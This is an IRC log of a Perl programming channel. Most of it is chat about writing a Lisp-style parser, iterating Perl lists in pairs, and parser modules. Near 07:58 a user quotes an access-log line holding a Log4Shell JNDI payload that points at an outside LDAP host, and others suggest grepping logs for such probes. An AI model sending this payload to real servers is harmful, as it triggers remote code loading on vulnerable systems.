[00:03:56] *** Joins: rorx (~rorx@cpe-65-24-161-82.columbus.res.rr.com)
[00:10:05] <vms14> https://perl.bot/p/9d2f9p seems will handle any code
[00:10:06] <Paperbot> Link title(s): [ Perlbot Pastebin ]
[00:10:26] <vms14> but I'm not sure
[00:11:46] <vms14> now I have some trouble with the semicolons when I want to generate perl code
[00:12:14] <vms14> I assume normal function calls unless I find a macro name
[00:13:42] <vms14> and I do the stuff recursively, but then is hard for me to keep track of wether I need a semicolon or not
[00:14:06] <buu> Just always add semicolons
[00:14:10] <buu> When in doubt
[00:14:29] <vms14> buu: yes, except when you recurse into function argument calls
[00:14:35] <buu> =[
[00:14:40] <buu> really?
[00:14:47] <buu> like foo(bar();)
[00:15:16] <vms14> like call(foo;bar;)
[00:15:38] <buu> awks
[00:15:46] <buu> maybe you can just use commas everywhere
[00:15:51] <buu> I'm not actually helping
[00:15:54] <vms14> I do xD
[00:16:05] <vms14> trailling commas everywhere
[00:16:44] <vms14> nah, I'll think about
[00:16:55] <vms14> it's not that hard I hope
[00:17:05] <vms14> I guess I'm overcomplicating myself
[00:17:39] <vms14> at least it seems the "ast part" works
[00:17:54] <vms14> is the dirtiest parser you've seen
[00:18:33] <vms14> but once I have the ast, now I should think how the language would be
[00:19:08] <vms14> I just want to fake it with source filters and maybe do stuff like (setf @a (qw 1 2 3))
[00:20:26] *** Quits: zkrd (~xdg@2a02:587:de00:400:5838:1693:39f:f462) (Ping timeout: 268 seconds)
[00:23:16] <vms14> it needs to handle strings, it splits them xd
[00:24:03] <vms14> meh, I have to make a real parser and stop using regex
[00:28:44] <simcop2387> vms14: i think it was you the other day who joked about it, but as far as i know perl.bot and the eval have no exploits/breaks in the security.  if you find one though i'll buy you a drink or something when possible.  the only ones i know of that *might* be possible to do are hardware exploits like row-hammer, at one point though dirty-cow was possible on it but nobody ever did it before i got
[00:28:51] <simcop2387> the kernel patched
[00:29:32] *** Quits: krismatrix (~krismatri@38.80.149.51) (Ping timeout: 240 seconds)
[00:30:50] *** Joins: rgrinberg (~textual@2806:101e:7:6946:301f:4093:a99:4144)
[00:30:55] <simcop2387> vms14: everything said though, you are absolutely encouraged to try to exploit it though.  it does log things and i won't ever go after someone for trying to exploit it (if you do exploit it and make it do things that get me in trouble though then you're getting thrown under the bus too though :)
[00:41:28] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[00:45:03] <vms14> simcop2387: xD I don't think I'll manage to break it some day
[00:45:37] <vms14> brb
[00:45:40] *** Quits: vms14 (~user@45.red-83-47-205.dynamicip.rima-tde.net) (Remote host closed the connection)
[00:47:23] *** Quits: fwg (~fwg@user/fwg) (Quit: .oO( zzZzZzz ...)
[00:53:08] *** Quits: G_SabinoMullane (~G_SabinoM@pool-72-94-251-236.phlapa.fios.verizon.net) (Ping timeout: 268 seconds)
[00:59:39] *** Quits: chiselfuse (~chiselfus@user/chiselfuse) (Ping timeout: 276 seconds)
[01:00:18] *** Quits: tejr (~tejr@user/tejr) (Ping timeout: 276 seconds)
[01:00:18] *** Quits: tusko (~yeurt@copyfree/advocate/tusko) (Ping timeout: 276 seconds)
[01:00:57] *** Quits: todd (~todd@gateway/tor-sasl/toddf) (Ping timeout: 276 seconds)
[01:00:57] *** Quits: FinnElija (~finn_elij@user/finn-elija/x-0085643) (Ping timeout: 276 seconds)
[01:00:57] *** Quits: yanmaani (~yanmaani@gateway/tor-sasl/yanmaani) (Ping timeout: 276 seconds)
[01:00:57] *** Quits: JayC (~JayC@gateway/tor-sasl/jayc) (Ping timeout: 276 seconds)
[01:11:52] *** Joins: FinnElija (~finn_elij@user/finn-elija/x-0085643)
[01:11:52] *** Joins: chiselfuse (~chiselfus@user/chiselfuse)
[01:11:57] *** Joins: tejr (~tejr@user/tejr)
[01:12:09] *** Joins: yanmaani (~yanmaani@gateway/tor-sasl/yanmaani)
[01:12:09] *** Joins: tusko (~yeurt@copyfree/advocate/tusko)
[01:12:38] *** Joins: todd (~todd@gateway/tor-sasl/toddf)
[01:13:10] *** Joins: JayC (~JayC@gateway/tor-sasl/jayc)
[01:17:19] *** Quits: pj (~pj@ghettoforge/pj) (Ping timeout: 250 seconds)
[01:23:02] *** Quits: martinus__ (~martin@96.19.201.77.rev.sfr.net) (Ping timeout: 240 seconds)
[01:27:34] *** Quits: proller (~p@80.240.216.69) (Ping timeout: 260 seconds)
[01:27:34] *** Quits: troller (~p@80.240.216.69) (Ping timeout: 260 seconds)
[01:28:45] *** Quits: monkey_ (~user@190.104.116.153) (Ping timeout: 252 seconds)
[01:30:28] *** Joins: pajamian (~pj@ghettoforge/pj)
[01:39:54] *** Joins: proller (~p@80.240.216.69)
[01:39:57] *** Joins: troller (~p@80.240.216.69)
[01:40:33] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Remote host closed the connection)
[01:48:05] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[01:49:51] *** A_Dragon is now known as Festive_Dragon
[01:52:25] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Ping timeout: 250 seconds)
[01:57:07] *** Joins: monkey_ (~user@190.104.116.153)
[02:05:09] *** Quits: leitz (~LeamHall@cpe-173-172-58-72.tx.res.rr.com) (Quit: nappy time)
[02:06:28] * GumbyPAN CPAN Upload: Minion-Backend-mysql-0.32 by PREACTION https://metacpan.org/release/PREACTION/Minion-Backend-mysql-0.32
[02:07:35] *** Quits: EvanCarroll (~ecarroll@c-76-30-158-126.hsd1.tx.comcast.net) (Ping timeout: 250 seconds)
[02:16:25] *** Quits: proller (~p@80.240.216.69) (Ping timeout: 252 seconds)
[02:16:40] *** Quits: troller (~p@80.240.216.69) (Ping timeout: 256 seconds)
[02:29:44] *** Joins: proller (~p@2a02:6b8:b081:8830::1:25)
[02:30:06] *** Joins: troller (~p@2a02:6b8:b081:8830::1:25)
[02:32:46] *** Quits: pizdets_ (~pizdets@183.182.110.89) (Ping timeout: 250 seconds)
[02:33:44] *** Joins: pizdets (~pizdets@183.182.110.248)
[02:33:51] *** Quits: TieUpYourCamel (~david@2600:1702:26a0:2000:6cfd:ed6c:3651:478) (Remote host closed the connection)
[02:36:23] *** Joins: jmdaemon (~jmdaemon@142.207.63.60)
[02:40:46] *** Quits: jmdaemon (~jmdaemon@142.207.63.60) (Client Quit)
[02:43:11] *** Joins: vms14 (~user@45.red-83-47-205.dynamicip.rima-tde.net)
[02:43:59] *** Joins: jmdaemon (~jmdaemon@142.207.63.60)
[02:44:00] *** Joins: GEttR (~GEttR@user/gettr)
[02:46:32] * GumbyPAN CPAN Upload: JSON-Schema-Modern-Document-OpenAPI-0.010 by ETHER https://metacpan.org/release/ETHER/JSON-Schema-Modern-Document-OpenAPI-0.010
[02:48:26] *** Quits: zer0bitz (~zer0bitz@dsl-hkibng32-54fbfb-173.dhcp.inet.fi) (Read error: Connection reset by peer)
[02:48:53] *** Quits: rgrinberg (~textual@2806:101e:7:6946:301f:4093:a99:4144) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[02:50:22] <Adura> lol java
[02:51:06] *** Joins: EvanCarroll (~ecarroll@68-78-105-35.lightspeed.hstntx.sbcglobal.net)
[02:54:04] *** Quits: Su-Shee (~Susanne@p4ffc7e1a.dip0.t-ipconnect.de) (Ping timeout: 256 seconds)
[02:55:55] *** Joins: Su-Shee (~Susanne@p4ffc79aa.dip0.t-ipconnect.de)
[03:11:00] *** Quits: jmdaemon (~jmdaemon@142.207.63.60) (Quit: WeeChat 3.3)
[03:11:23] *** Joins: jmdaemon (~jmdaemon@142.207.63.60)
[03:12:20] *** Quits: jmdaemon (~jmdaemon@142.207.63.60) (Client Quit)
[03:12:38] *** Joins: jmdaemon (~jmdaemon@142.207.63.60)
[03:14:24] *** Quits: djerius (~quassel@pool-108-20-43-199.bstnma.fios.verizon.net) (Quit: No Ping reply in 180 seconds.)
[03:14:51] *** Joins: djerius (~quassel@pool-108-20-43-199.bstnma.fios.verizon.net)
[03:14:53] *** Quits: jmdaemon (~jmdaemon@142.207.63.60) (Client Quit)
[03:15:21] *** Joins: jmdaemon (~jmdaemon@142.207.63.60)
[03:17:54] *** Quits: jmdaemon (~jmdaemon@142.207.63.60) (Client Quit)
[03:18:12] *** Joins: jmdaemon (~jmdaemon@142.207.63.60)
[03:20:57] *** Quits: jmdaemon (~jmdaemon@142.207.63.60) (Client Quit)
[03:30:35] *** Joins: jmdaemon (~jmdaemon@142.207.63.60)
[03:33:36] *** Quits: jmdaemon (~jmdaemon@142.207.63.60) (Changing host)
[03:33:36] *** Joins: jmdaemon (~jmdaemon@user/jmdaemon)
[03:34:52] *** Quits: jmdaemon (~jmdaemon@user/jmdaemon) (Client Quit)
[03:38:54] *** Quits: todd (~todd@gateway/tor-sasl/toddf) (Ping timeout: 276 seconds)
[03:45:46] *** Joins: whynot (~whynot@37.73.131.53)
[03:47:31] *** Quits: wwalker (~wwalker@platinum.solid-constructs.com) (Quit: leaving)
[03:49:58] *** Joins: wwalker (~wwalker@platinum.solid-constructs.com)
[04:01:59] *** Quits: radu242407 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net) (Ping timeout: 256 seconds)
[04:03:51] *** Quits: Pali (~pali@user/pali) (Ping timeout: 252 seconds)
[04:17:15] *** Quits: geli (~gelignite@55d43f19.access.ecotel.net) (Quit: Stay safe!)
[04:20:14] *** Quits: proller (~p@2a02:6b8:b081:8830::1:25) (Ping timeout: 260 seconds)
[04:20:21] *** Quits: troller (~p@2a02:6b8:b081:8830::1:25) (Ping timeout: 252 seconds)
[04:23:13] *** Quits: dextercd (~dexter@2a02-a450-f25d-1-76d4-35ff-fefe-34c.fixed6.kpn.net) (Quit: WeeChat 3.3)
[04:36:10] *** Quits: djerius (~quassel@pool-108-20-43-199.bstnma.fios.verizon.net) (Read error: Connection reset by peer)
[04:39:03] *** Quits: TonyStone (~TonyStone@2603-7080-8607-c36a-9cdb-69bc-753b-1e50.res6.spectrum.com) (Quit: Leaving)
[04:39:23] *** Joins: TonyStone (~TonyStone@2603-7080-8607-c36a-9cdb-69bc-753b-1e50.res6.spectrum.com)
[04:39:49] *** Joins: djerius (~quassel@pool-108-20-43-199.bstnma.fios.verizon.net)
[04:41:44] * GumbyPAN CPAN Upload: Yancy-1.086 by PREACTION https://metacpan.org/release/PREACTION/Yancy-1.086
[04:42:43] *** Quits: zgu (~zgu@2603-7080-b704-0800-e4e2-df43-fd5d-e657.res6.spectrum.com) (Ping timeout: 252 seconds)
[04:45:18] *** Quits: TonyStone (~TonyStone@2603-7080-8607-c36a-9cdb-69bc-753b-1e50.res6.spectrum.com) (Quit: Leaving)
[04:45:39] *** Joins: TonyStone (~TonyStone@2603-7080-8607-c36a-9cdb-69bc-753b-1e50.res6.spectrum.com)
[04:47:20] *** Quits: monkey_ (~user@190.104.116.153) (Read error: Connection reset by peer)
[04:48:24] *** Joins: kitsunenokenja (~kitsunech@68.91.220.96)
[04:48:31] *** Joins: proller (~p@2a02:6b8:b081:8802::1:14)
[04:48:39] *** Quits: TonyStone (~TonyStone@2603-7080-8607-c36a-9cdb-69bc-753b-1e50.res6.spectrum.com) (Client Quit)
[04:49:16] *** Joins: monkey_ (~user@190.104.116.153)
[04:50:22] *** Joins: bfr (~bfr@ip-109-43-113-142.web.vodafone.de)
[04:50:45] *** Joins: TonyStone (~TonyStone@2603-7080-8607-c36a-9cdb-69bc-753b-1e50.res6.spectrum.com)
[04:52:16] <vms14> my $object_type = (my $object = oh->new())->{type}; didn't know we could do that
[04:53:42] <vms14> sweval: {package oh; sub new { bless {qw/name oh type meh/} }} my $object_type = (my $object = oh->new())->{type}; print "$object_type: $object"
[04:53:44] <perlbot> vms14: meh: oh=HASH(0x55778c6e0848)
[04:56:41] *** Joins: aetnaeus_ (~qpls@cpeb4750e67d202-cmf81d0fad5840.cpe.net.fido.ca)
[04:57:04] *** Joins: fstd (~fstd@xdsl-85-197-54-43.nc.de)
[05:00:08] *** Quits: fstd_ (~fstd@xdsl-81-173-139-70.nc.de) (Ping timeout: 252 seconds)
[05:02:08] *** Quits: kitsunenokenja (~kitsunech@68.91.220.96) (Ping timeout: 256 seconds)
[05:12:14] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[05:13:06] <vms14> how can I avoid this: while (@stuff) { print shift(@stuff),' ',shift(@stuff),"\n"; } 
[05:13:27] <vms14> for when I have to use elements by pairs and cannot use a hash due to repeated elements
[05:15:58] *** Joins: rgrinberg (~textual@2806:101e:7:6946:301f:4093:a99:4144)
[05:16:27] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Ping timeout: 252 seconds)
[05:20:11] <xenu> eval: use List::Util 'pairs'; for my $pair (pairs @stuff) { say join(' ', @$pair) }
[05:20:12] <perlbot> xenu: No output.
[05:20:28] <xenu> eval: use List::Util 'pairs'; @stuff = ("foo", "bar"); for my $pair (pairs @stuff) { say join(' ', @$pair) }
[05:20:30] <perlbot> xenu: foo bar 
[05:20:50] <xenu> or you can wait for perl 5.36 :P
[05:21:06] <xenu> in perl 5.36 it will be possible to do this: for my($key, $value) (@foo) { ... }
[05:21:19] <sivoais> oooh, nice
[05:23:07] <sivoais> ah, here it is: <https://github.com/Perl/RFCs/blob/master/rfcs/rfc0001.md>
[05:23:07] <Paperbot> Link title(s): [ RFCs/rfc0001.md at master · Perl/RFCs · GitHub ]
[05:23:44] <xenu> it's already in blead
[05:24:16] <xenu> eval: @bar = ("abc", "def"); for my($foo, $bar) (@bar) { say "$foo: $bar" }
[05:24:18] <perlbot> xenu: for my (...) is experimental at (IRC) line 1. abc: def 
[05:24:40] <sivoais> i still haven't used postderef in my library code for CPAN :-P
[05:25:00] <xenu> simcop2387: could disable that warning? ^
[05:25:08] <xenu> could you*
[05:25:42] *** Quits: bfr (~bfr@ip-109-43-113-142.web.vodafone.de) (Remote host closed the connection)
[05:28:41] <vms14> xenu: I saw each works with arrays too
[05:28:57] <vms14> btw any idea of why this does not work?
[05:29:36] <vms14> http://perl.bot/p/qipgir
[05:29:36] <Paperbot> Link title(s): [ Perlbot Pastebin ]
[05:30:54] <vms14> https://perl.bot/p/nr4quk this one works
[05:30:54] <Paperbot> Link title(s): [ Perlbot Pastebin ]
[05:31:19] <vms14> gives me start ( symbol oh symbol my symbol cat end ) EOI
[05:31:28] <vms14> but the first one dies
[05:31:42] <vms14> Can't call method "name" on an undefined value at /usr/pkg/lib/perl5/site_perl/5.34.0/Parse/ALex.pm line 874.
[05:31:57] *** Quits: rgrinberg (~textual@2806:101e:7:6946:301f:4093:a99:4144) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[05:33:36] <vms14> I don't know if it's my grammar wrong
[05:33:43] <vms14> or the module itself
[05:33:59] <vms14> it should just recognize the tokens
[05:34:33] *** Quits: AndrewYu (~andrew@user/andrewyu) (Remote host closed the connection)
[05:34:41] *** Joins: bfr (~bfr@ip-109-43-113-142.web.vodafone.de)
[05:34:42] *** Quits: bfr (~bfr@ip-109-43-113-142.web.vodafone.de) (Remote host closed the connection)
[05:36:48] <vms14> it's my grammar I guess
[05:39:09] *** Joins: rgrinberg (~textual@2806:101e:7:6946:301f:4093:a99:4144)
[05:41:05] <xenu> each() isn't recommended because it uses a global iterator which leads to unpleasant surprises
[05:43:04] <vms14> xenu: which surprises? :0
[05:46:53] *** Quits: Su-Shee (~Susanne@p4ffc79aa.dip0.t-ipconnect.de) (Ping timeout: 252 seconds)
[05:47:26] <vms14> I could make a lisp with semicolons
[05:47:39] <vms14> (use strict ;)
[05:48:19] <vms14> wow, I'm always kind of sad cause my lines of code end with );
[05:48:27] <vms14> this would make my code happy
[05:48:45] *** Joins: Su-Shee (~Susanne@p4ffc7581.dip0.t-ipconnect.de)
[05:50:32] <xenu> vms14: https://perl.bot/p/mnooaj
[05:50:32] <Paperbot> Link title(s): [ Perlbot Pastebin ]
[05:50:45] <xenu> it is surprising that iteration inside some_function() doesn't start from the beginning of the array
[05:51:43] <xenu> (also each() doesn't do what you wanted, because it returns an index and a value, not two values)
[05:52:17] *** Joins: bfr (~bfr@ip-109-43-113-142.web.vodafone.de)
[05:53:38] *** Joins: TieUpYourCamel (~david@2600:1702:26a0:2000:3de8:a69b:aa58:cd19)
[05:53:44] <xenu> also, for parsing i recommend Parser::MGC, it's very simple
[05:53:45] *** Quits: bfr (~bfr@ip-109-43-113-142.web.vodafone.de) (Remote host closed the connection)
[05:53:51] <xenu> Marpa::R2 is also a reasonable option
[05:54:43] <xenu> there's also Regexp::Grammars if you're into weird stuff
[05:58:15] *** Quits: monkey_ (~user@190.104.116.153) (Ping timeout: 252 seconds)
[05:59:41] <sivoais> there's also Pegex for PEG parsing
[06:00:37] <vms14> I just need a lexer
[06:00:59] <vms14> actually I think I should just make my own, as it's for parsing lisp code
[06:01:14] <vms14> there are only strings numbers and symbols
[06:01:20] <vms14> and () 
[06:01:39] <vms14> maybe keywords, I like them
[06:02:26] *** Quits: proller (~p@2a02:6b8:b081:8802::1:14) (Ping timeout: 260 seconds)
[06:06:37] <vms14> xenu: Parser::MGC looks nice
[06:08:13] *** Joins: monkey_ (~user@190.104.116.153)
[06:09:38] *** Quits: darkstarx (~darkstard@50.39.115.145) (Remote host closed the connection)
[06:16:16] *** Joins: llh (~llh@user/llh)
[06:18:51] <vms14> Parse::Lex works fine btw
[06:18:59] <vms14> I was doing wrong stuf
[06:19:02] *** Quits: monkey_ (~user@190.104.116.153) (Remote host closed the connection)
[06:19:08] <vms14> stuff
[06:20:00] <vms14> well still crashes and idk why
[06:22:10] <simcop2387> xenu: i could yes.
[06:22:32] *** Joins: monkey_ (~user@190.104.116.153)
[06:29:49] *** Quits: Su-Shee (~Susanne@p4ffc7581.dip0.t-ipconnect.de) (Ping timeout: 268 seconds)
[06:31:42] *** Joins: Su-Shee (~Susanne@p4ff49fb1.dip0.t-ipconnect.de)
[06:34:30] *** Quits: bmodotdev (bmo@user/bmodotdev) (Ping timeout: 256 seconds)
[06:36:05] *** Joins: bmodotdev (~bmo@user/bmodotdev)
[06:36:53] *** Quits: Peppard (~quassel@2a01:c22:7336:fa00:9c79:1f1d:3dce:7cb3) (Ping timeout: 250 seconds)
[06:36:56] * GumbyPAN CPAN Upload: Module-cpmfile-0.003 by SKAJI https://metacpan.org/release/SKAJI/Module-cpmfile-0.003
[06:37:29] *** Joins: Peppard (~quassel@2a01:c23:bce6:5100:b020:fa11:6533:b6b0)
[06:41:18] *** Joins: finn_elija (~finn_elij@user/finn-elija/x-0085643)
[06:41:18] *** Quits: FinnElija (~finn_elij@user/finn-elija/x-0085643) (Killed (NickServ (Forcing logout FinnElija -> finn_elija)))
[06:41:18] *** finn_elija is now known as FinnElija
[06:46:57] * GumbyPAN CPAN Upload: XML-SAX-SVGTransformer-0.03 by ISHIGAKI https://metacpan.org/release/ISHIGAKI/XML-SAX-SVGTransformer-0.03
[06:46:57] * GumbyPAN CPAN Upload: Dist-Zilla-Plugin-Prereqs-From-cpmfile-v0.0.3 by SKAJI https://metacpan.org/release/SKAJI/Dist-Zilla-Plugin-Prereqs-From-cpmfile-v0.0.3
[06:47:45] <vms14> https://perl.bot/p/keront this works, but... the lisp package just pushes parenthesis one word to the left xD
[06:47:45] <Paperbot> Link title(s): [ Perlbot Pastebin ]
[06:47:53] <vms14> right*
[06:48:02] *** Joins: darkstardevx (~darkstard@50.39.115.145)
[06:48:24] <vms14> http://perl.bot/p/olx2i9
[06:48:25] <Paperbot> Link title(s): [ Perlbot Pastebin ]
[06:49:01] *** Quits: darkstardevx (~darkstard@50.39.115.145) (Remote host closed the connection)
[06:49:26] *** Joins: darkstardevx (~darkstard@50.39.115.145)
[06:50:06] *** Quits: darkstardevx (~darkstard@50.39.115.145) (Remote host closed the connection)
[06:50:29] *** Joins: darkstardevx (~darkstard@50.39.115.145)
[06:54:07] *** Quits: darkstardevx (~darkstard@50.39.115.145) (Read error: Connection reset by peer)
[06:57:59] *** Joins: darkstardevx (~darkstard@50.39.115.145)
[06:58:52] *** Quits: darkstardevx (~darkstard@50.39.115.145) (Remote host closed the connection)
[06:59:16] *** Joins: darkstardevx (~darkstard@50.39.115.145)
[07:02:53] *** Joins: The_Blode_ (~Blode@user/the-blode/x-7164444)
[07:03:07] *** Quits: The_Blode (~Blode@user/the-blode/x-7164444) (Ping timeout: 250 seconds)
[07:06:53] *** Joins: G_SabinoMullane (~G_SabinoM@pool-72-94-251-236.phlapa.fios.verizon.net)
[07:12:55] *** Joins: The_Blode (~Blode@user/the-blode/x-7164444)
[07:13:03] *** Quits: The_Blode_ (~Blode@user/the-blode/x-7164444) (Ping timeout: 252 seconds)
[07:20:47] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[07:27:44] *** Joins: zgu (~zgu@2603-7080-b704-0800-e4e2-df43-fd5d-e657.res6.spectrum.com)
[07:30:36] <Adura> Log::Log4perl doesn't have Log4j's neat RCE feature, right?
[07:30:47] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Remote host closed the connection)
[07:34:35] *** Quits: Peppard (~quassel@2a01:c23:bce6:5100:b020:fa11:6533:b6b0) (Ping timeout: 268 seconds)
[07:34:40] *** Joins: Peppaq (~quassel@2a01:c23:b8af:5e00:b020:fa11:6533:b6b0)
[07:39:30] *** Quits: diskin (~diskin@5.139.138.52) (Ping timeout: 268 seconds)
[07:43:09] *** Joins: bfr (~bfr@ip-109-43-113-142.web.vodafone.de)
[07:45:57] *** Quits: monkey_ (~user@190.104.116.153) (Remote host closed the connection)
[07:46:36] *** Quits: vms14 (~user@45.red-83-47-205.dynamicip.rima-tde.net) (Remote host closed the connection)
[07:50:28] *** Quits: whynot (~whynot@37.73.131.53) (Quit: leaving)
[07:51:14] <xenu> i *think* log4perl doesn't do variables substituion
[07:51:19] <xenu> substitution
[07:51:40] <xenu> and even if it does, certainly it doesn't implement jndi lookup or anything similar to it :P
[07:53:24] <Adura> Maybe they made a pndi...!
[07:55:01] <Adura> grep your access logs for ${ for fun.
[07:56:56] <xenu> yeah, it seems they're trying to exploit my placeholder site that isn't even indexed by google
[07:56:57] *** Quits: bfr (~bfr@ip-109-43-113-142.web.vodafone.de) (Remote host closed the connection)
[07:57:59] <xenu> actually, it seems they're white hats
[07:58:02] <xenu> "GET /$%7Bjndi:ldap://http80path.kryptoslogic-cve-2021-44228.com/http80path%7D HTTP/1.1" 404 196
[07:58:08] <Adura> I saw that one.
[07:58:20] <Adura> basheval: grep -P "\$\{\" /var/log/nginx/access.log
[07:58:21] <perlbot> Adura: /tmp/azHrhuRRJN: line 1: unexpected EOF while looking for matching `"'␤/tmp/azHrhuRRJN: line 2: syntax error: unexpected end of file␤[Exited 2]
[07:58:40] <Adura> Oh, overdid that.
[07:58:43] <Adura> basheval: grep -P "\$\{" /var/log/nginx/access.log
[07:58:45] <perlbot> Adura: grep: /var/log/nginx/access.log: No such file or directory␤[Exited 2]
[08:00:23] <zgu> hmm. need to add some kind of time skip detection to my zoneminder timelapse script
[08:06:52] *** Joins: Hawker (~pi@drmons0544w-47-55-147-54.dhcp-dynamic.fibreop.ns.bellaliant.net)
[08:06:52] *** Quits: Hawker (~pi@drmons0544w-47-55-147-54.dhcp-dynamic.fibreop.ns.bellaliant.net) (Changing host)
[08:06:52] *** Joins: Hawker (~pi@user/hawker)
[08:06:54] <zgu> or rewrite it to use IO::Async::Timer::Periodic with reschedule => 'skip'
[08:07:06] * GumbyPAN CPAN Upload: Util-H2O-More-0.0.1-TRIAL by OODLER https://metacpan.org/release/OODLER/Util-H2O-More-0.0.1-TRIAL
[08:07:10] <zgu> apparently LeoNerd has an answer for everything
[08:09:28] *** Joins: deadmarshal (~deadmarsh@95.38.114.98)
[08:14:39] *** Quits: Hawker (~pi@user/hawker) (Quit: leaving)
[08:14:55] *** Joins: Hawker (~pi@user/hawker)
[08:19:34] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[08:20:14] *** Joins: kitsunenokenja (~kitsunech@68.91.220.96)
[08:22:55] *** Joins: Martchus_ (~martchus@2a01:c23:bcbc:9d00:d250:99ff:fe49:3cce)
[08:23:50] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Ping timeout: 260 seconds)
[08:24:18] *** Quits: Martchus (~martchus@dynamic-077-007-110-017.77.7.pool.telefonica.de) (Ping timeout: 260 seconds)
[08:24:34] *** Quits: Hawker (~pi@user/hawker) (Quit: Lost terminal)
[08:25:45] *** Quits: G_SabinoMullane (~G_SabinoM@pool-72-94-251-236.phlapa.fios.verizon.net) (Ping timeout: 268 seconds)
[08:26:26] *** Joins: Hawker (~pi@user/hawker)
[08:28:37] *** Quits: slowButPresent (~slowButPr@user/slowbutpresent) (Quit: leaving)
[08:30:32] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:719f:b1db:e5b1:8e4a) (Ping timeout: 240 seconds)
[08:32:58] *** Joins: vms14 (~user@45.red-83-47-205.dynamicip.rima-tde.net)
[08:33:38] *** Quits: Hawker (~pi@user/hawker) (Quit: leaving)
[08:34:01] *** Joins: Hawker (~pi@user/hawker)
[08:37:04] *** Joins: rindolf (~shlomif@2a0d:6fc2:4bb1:500:6b1e:2524:3d70:36ec)
[08:40:21] *** pajamian is now known as pj
[08:44:04] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[08:48:37] *** Quits: rgrinberg (~textual@2806:101e:7:6946:301f:4093:a99:4144) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[08:49:12] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 268 seconds)
[08:51:49] *** Quits: tejr (~tejr@user/tejr) (Remote host closed the connection)
[08:52:16] *** Joins: tejr (~tejr@user/tejr)
[08:59:54] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[09:04:27] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 250 seconds)
[09:05:21] *** Quits: aquanight (~aquanight@174-126-159-166.cpe.sparklight.net) (Ping timeout: 245 seconds)
[09:08:56] *** Joins: deadmarshal_ (~deadmarsh@95.38.230.202)
[09:09:32] *** Quits: deadmarshal (~deadmarsh@95.38.114.98) (Ping timeout: 268 seconds)
[09:13:41] *** Quits: stkrdknmibalz (~test@rrcs-75-87-43-226.sw.biz.rr.com) (Ping timeout: 252 seconds)
[09:13:43] *** Joins: gamo (~Thunderbi@cm-93-156-61-102.telecable.es)
[09:20:52] *** Quits: darkstardevx (~darkstard@50.39.115.145) (Remote host closed the connection)
[09:25:54] *** Quits: kitsunenokenja (~kitsunech@68.91.220.96) (Ping timeout: 260 seconds)
[09:29:37] *** Joins: darkstardevx (~darkstard@50.39.115.145)
[09:30:53] *** Quits: darkstardevx (~darkstard@50.39.115.145) (Remote host closed the connection)
[09:31:17] *** Joins: darkstardevx (~darkstard@50.39.115.145)
[09:31:52] *** Quits: Sauvin (~sauvin@about/linux/staff/sauvin) (Ping timeout: 256 seconds)
[09:32:29] *** Joins: Sauvin (~sauvin@about/linux/staff/sauvin)
[09:34:31] *** Quits: darkstardevx (~darkstard@50.39.115.145) (Read error: Connection reset by peer)
[09:36:17] *** Joins: darkstardevx (~darkstard@50.39.115.145)
[09:37:26] *** Quits: darkstardevx (~darkstard@50.39.115.145) (Remote host closed the connection)
[09:37:51] *** Joins: darkstardevx (~darkstard@50.39.115.145)
[09:43:40] *** Joins: bfr (~bfr@ip-109-43-113-142.web.vodafone.de)
[09:48:02] <vms14> http://www.thecatisonthetable.tk/k
[09:48:22] <vms14> it's forth
[09:49:17] <vms14> just need to provide the functions to the user, but this forth can compile stuff to perl
[09:53:54] *** Quits: The_Blode (~Blode@user/the-blode/x-7164444) (Ping timeout: 260 seconds)
[09:53:56] *** Quits: bfr (~bfr@ip-109-43-113-142.web.vodafone.de) (Remote host closed the connection)
[09:55:33] *** Joins: zkrd (~xdg@2a02:587:de00:400:f4ab:2db4:2d71:c63e)
[09:59:44] *** Joins: The_Blode (~Blode@user/the-blode/x-7164444)
[10:03:52] *** Joins: rgrinberg (~textual@187.223.209.106)
[10:09:40] *** Quits: vms14 (~user@45.red-83-47-205.dynamicip.rima-tde.net) (Remote host closed the connection)
[10:23:25] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[10:27:52] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Ping timeout: 268 seconds)
[11:11:42] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[11:16:32] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 240 seconds)
[11:20:05] *** Quits: PancakeMatsuri (~textual@122-57-178-216-fibre.sparkbb.co.nz) (Read error: Connection reset by peer)
[11:20:37] *** Joins: PancakeMatsuri (~textual@122-57-178-216-fibre.sparkbb.co.nz)
[11:30:18] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[11:30:49] *** Quits: kevin-oculus (~tomys@c188-149-14-10.bredband.tele2.se) (Ping timeout: 252 seconds)
[11:35:04] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 268 seconds)
